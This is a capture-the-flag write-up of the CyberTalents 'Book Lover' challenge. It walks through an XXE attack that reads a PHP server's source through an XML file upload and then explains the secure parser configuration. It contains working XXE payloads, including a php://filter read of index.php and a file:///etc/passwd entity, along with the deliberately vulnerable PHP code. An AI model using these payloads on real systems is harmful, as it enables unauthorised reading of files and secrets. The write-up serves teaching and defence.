# Book Lover — CyberTalents

---

## Challenge Description
**Share your love for books and search for the flag inside the source code.**

## Challenge Link
http://cdcamxwl32pue3e6mgjk31eotrvmem236mnkmugv0-web.cybertalentslabs.com

---

## 1. Initial Interface

The challenge is accessed via the CyberTalents platform, which displays the challenge title, description, and a link to launch the target web application.

<p align="center">
<img width="671" height="369" alt="image" src="https://github.com/user-attachments/assets/a40b0d23-66e9-4eff-bb1b-b76605988757" />
</p>

---

## 2. Challenge Page — File Upload Interface

Upon navigating to the challenge URL, a web page is presented with the following prompt:

> **"Book Lover — Share your love, by sharing us your library"**

The page contains two input fields and an upload button:
- A text field for the user's name
- A file upload field that **only accepts XML files**
- An **Upload** button to submit

<p align="center">
<img width="836" height="302" alt="image" src="https://github.com/user-attachments/assets/a49acc2d-584c-43b5-82bd-e052464ccfd5" />
</p>

The challenge description hints that the flag is hidden inside the source code — meaning the goal is not to exploit a login or bypass authentication, but to **read the server-side PHP source file** using the XML upload as an attack vector. This points directly to **XXE (XML External Entity) Injection**.

---

## 3. Understanding XXE — What is XML External Entity Injection

### What is XXE

**XXE (XML External Entity Injection)** is a vulnerability that occurs when an XML parser processes user-supplied XML input that contains a reference to an external entity. If the XML parser is configured to resolve external entities, an attacker can use this to:

- Read arbitrary files from the server filesystem
- Read server-side source code
- Perform Server-Side Request Forgery (SSRF)
- In some configurations, execute remote code

### How XML Entities Work

XML supports a feature called **entities** — reusable values that can be defined and referenced inside an XML document. A basic entity looks like this:

```xml
<?xml version="1.0"?>
<!DOCTYPE example [
    <!ENTITY name "Hello World">
]>
<root>&name;</root>
```

When the parser processes `&name;`, it replaces it with `Hello World`. This is the intended use — but the `SYSTEM` keyword allows an entity to reference an **external resource**, including files on the server:

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

When `&xxe;` is referenced in the XML body, the parser reads `/etc/passwd` and injects its contents into the output.

### XXE vs LFI Comparison

| | XXE | LFI |
|---|---|---|
| **Attack vector** | Malicious XML uploaded or submitted | URL parameter pointing to a file |
| **Parser involved** | XML parser | PHP `include()` / `require()` |
| **Read PHP source** | Use `php://filter` wrapper | Use `php://filter` wrapper |
| **Requires** | XML input accepted by server | Dynamic file loading via GET parameter |
| **OWASP Category** | A05 Security Misconfiguration | A03 Injection |

---

## 4. Step 1 — Upload a Valid XML to Confirm the Feature Works

Before attempting XXE, a basic valid XML file is uploaded to confirm the upload feature is working and that XML content is processed and reflected in the response:

```xml
<?xml version="1.0"?>
<book>
    <title>Test Book</title>
</book>
```

This confirms:
- The server accepts `.xml` files with `text/xml` content type
- The XML content is parsed and the text content is displayed on the page
- The parser is active — meaning any entity defined in the XML will also be processed

---

## 5. Step 2 — Craft the XXE Payload to Read the PHP Source

Since the challenge description says the flag is inside the source code, the goal is to read `index.php` using an XXE payload. Direct file reading with `file://` would execute the PHP and return the rendered output — not the raw source code. Instead, the `php://filter` wrapper is used to **Base64-encode the file before reading it**, which prevents PHP execution and returns the raw source as an encoded string.

### The XXE Payload

```xml
<?xml version="1.0"?>
<!DOCTYPE book [
    <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<book>
    <title>&xxe;</title>
</book>
```

### Payload Breakdown Table

| Component | Meaning |
|-----------|---------|
| `<?xml version="1.0"?>` | Standard XML declaration — required for valid XML |
| `<!DOCTYPE book [...]>` | Defines a Document Type Declaration — where external entities are declared |
| `<!ENTITY xxe SYSTEM "...">` | Declares an external entity named `xxe` that reads from a system resource |
| `php://filter/convert.base64-encode` | PHP stream wrapper — Base64-encodes the file content before returning it |
| `resource=index.php` | The target file to read — the server-side PHP source |
| `&xxe;` | Entity reference — replaced by the file contents when the parser processes the XML |

### Why `php://filter` Instead of `file://`

| Wrapper | What Happens | Useful? |
|---------|-------------|---------|
| `file:///var/www/html/index.php` | PHP executes the file — returns rendered HTML output | ❌ Source code not visible |
| `php://filter/convert.base64-encode/resource=index.php` | File is Base64-encoded before being returned — PHP cannot execute it | ✅ Full raw source code returned |

The `php://filter` wrapper intercepts the file read and applies the `convert.base64-encode` filter — turning the raw PHP into a Base64 string. This string is then injected into the XML output as the value of `&xxe;`, which the server echoes back in the page response.

---

## 6. Uploading the XXE Payload — Base64 Response Received

The XXE payload is saved as a `.xml` file and uploaded through the Book Lover upload form. The server processes the XML, resolves the `&xxe;` entity by reading `index.php` through the `php://filter` wrapper, and outputs the Base64-encoded source code in the page response.

<p align="center">
<img width="437" height="329" alt="image" src="https://github.com/user-attachments/assets/33c93d2f-3b88-4b70-b071-7faedee2aca1" />
</p>

The server returns a long Base64-encoded string:

```
PD9waHAKJGZsYWcgPSAneGVlZmxhZzM0NSc7CgpsaWJ4bWxfZGlzYWJsZV9lbnRpdHlfbG9hZGVyKGZhbHNlKTsK...
```

---

## 7. Decoding the Base64 — PHP Source Code Revealed

The Base64 string is decoded using an online tool at [https://www.base64decode.org/](https://www.base64decode.org/) or via terminal:

```bash
echo "PD9waHAKJGZsYWcgPSAneGVlZmxhZzM0NSc7..." | base64 -d
```

The decoded output reveals the full PHP source code of `index.php`. At the very top of the file, the flag is hardcoded:

```php
<?php
$flag = 'xeeflag345';

libxml_disable_entity_loader(false);

if($_FILES){
  $books = $_FILES['books'];
  if($books['type'] != 'text/xml'){
    echo 'Only xml Document Allowed';
    exit;
  }
  $ext = pathinfo($books['name'], PATHINFO_EXTENSION);
  if($ext != 'xml'){
    echo 'Only xml Extention Are Allowed';
    exit;
  }
  
  $xmlstr = file_get_contents($books['tmp_name']);
  $doc = new DOMDocument();
  
  $doc->loadXML($xmlstr, LIBXML_NOENT);
  $items = $doc->getElementsByTagName('book');

  $name = $_POST['name'];
  $content = nl2br($doc->textContent);
}
?>
```

### Key Lines in the Decoded Source

| Line | What It Reveals |
|------|----------------|
| `$flag = 'xeeflag345';` | The flag — hardcoded at the top of the file |
| `libxml_disable_entity_loader(false);` | External entity loading is explicitly **enabled** — this is what makes XXE possible |
| `$doc->loadXML($xmlstr, LIBXML_NOENT);` | `LIBXML_NOENT` flag tells the parser to **resolve entity references** — required for XXE to work |
| `$books['type'] != 'text/xml'` | Content-Type check — only `text/xml` accepted |
| `$ext != 'xml'` | File extension check — only `.xml` files accepted |

The two critical lines that enable XXE are `libxml_disable_entity_loader(false)` and `LIBXML_NOENT`. Together they tell the PHP XML parser to load and resolve external entities — exactly the configuration that allows the `SYSTEM` entity to read server files.

> **FLAG: `xeeflag345`**

---

# OWASP Classification

> **OWASP Top 10: A05 — Security Misconfiguration**
> The PHP XML parser was explicitly configured to allow external entity loading via `libxml_disable_entity_loader(false)` and the `LIBXML_NOENT` flag in `loadXML()`. This configuration is dangerous by default — it allows any uploaded XML file to reference and read arbitrary files from the server filesystem. Combined with the `php://filter` wrapper, the attacker was able to read and exfiltrate the raw PHP source code of `index.php`, which contained the hardcoded flag.

---

# Why This Is a Security Issue

| Vulnerability | Impact |
|--------------|--------|
| `libxml_disable_entity_loader(false)` | Explicitly enables external entity resolution — XXE is possible |
| `LIBXML_NOENT` flag in `loadXML()` | Instructs parser to substitute entity references — `&xxe;` is resolved |
| `php://filter` wrapper not blocked | Attacker can read any PHP file as Base64 — source code fully exposed |
| Flag hardcoded in PHP source | Once source is readable, flag is immediately visible |
| No XML schema validation | Uploaded XML is parsed without any structure or content restrictions |

### The Correct Fix

```php
// VULNERABLE — external entity loading explicitly enabled
libxml_disable_entity_loader(false);
$doc->loadXML($xmlstr, LIBXML_NOENT);

// SECURE — disable external entity loading
libxml_disable_entity_loader(true);
$doc->loadXML($xmlstr);

// ALSO SECURE — use LIBXML_NONET to prevent network access
// and remove LIBXML_NOENT to prevent entity substitution
$doc->loadXML($xmlstr, LIBXML_NONET);
```

The fix is to call `libxml_disable_entity_loader(true)` before parsing any XML — this disables external entity loading entirely. Additionally, the `LIBXML_NOENT` flag should be removed from the `loadXML()` call, as it is the flag that instructs the parser to resolve entity references.

### XXE Prevention Checklist

| Fix | How |
|-----|-----|
| Disable external entities | `libxml_disable_entity_loader(true)` in PHP |
| Remove `LIBXML_NOENT` flag | Do not pass this flag to `loadXML()` or `loadHTML()` |
| Use a safe XML library | Libraries like `defusedxml` in Python disable XXE by default |
| Validate XML structure | Use XML Schema (XSD) to reject unexpected entity declarations |
| Never hardcode secrets in source files | Store flags and credentials in environment variables or a secrets manager |

---

# Exploitation Flow (OWASP A05 Mapping)

1. Attacker accesses the Book Lover challenge page
2. Challenge description noted — flag is inside the source code
3. Page contains an XML file upload form — XXE attack vector identified
4. Valid XML file uploaded first — confirms parser is active and output is reflected
5. XXE payload crafted using `php://filter/convert.base64-encode/resource=index.php`
6. Payload saved as `.xml` file — uploaded through the form
7. Server resolves `&xxe;` entity — reads `index.php` through `php://filter` wrapper
8. Base64-encoded source code returned in page response
9. Base64 string decoded using base64decode.org or `base64 -d` in terminal
10. Full PHP source code revealed — `$flag = 'xeeflag345'` found at top of file
11. **FLAG: `xeeflag345`**

---

# Conclusion

This challenge demonstrates **XXE (XML External Entity) Injection** — a vulnerability that occurs when a PHP XML parser is configured to resolve external entity references in user-supplied XML. The developer explicitly enabled this dangerous configuration using `libxml_disable_entity_loader(false)` and the `LIBXML_NOENT` flag — turning every XML upload into a potential file read attack.

By combining the XXE external entity with the `php://filter` stream wrapper, the entire PHP source file was Base64-encoded and returned in the server response — revealing the hardcoded flag without ever needing to guess a password or bypass authentication.

The lesson: **XML parsers must never be configured to resolve external entities from user-supplied input**. Modern PHP versions disable external entity loading by default — but any code that explicitly re-enables it with `libxml_disable_entity_loader(false)` is immediately vulnerable.

To prevent XXE vulnerabilities, applications should:

- **Disable external entity loading** — call `libxml_disable_entity_loader(true)` before parsing any XML
- **Remove the `LIBXML_NOENT` flag** — never pass it to `loadXML()` unless external entities are absolutely required
- **Validate XML structure with a schema** — reject any XML that contains `DOCTYPE` or `ENTITY` declarations
- **Never hardcode secrets in source files** — flags, passwords, and API keys belong in environment variables
- **Use updated PHP versions** — PHP 8.0+ disables external entity loading by default via libxml2
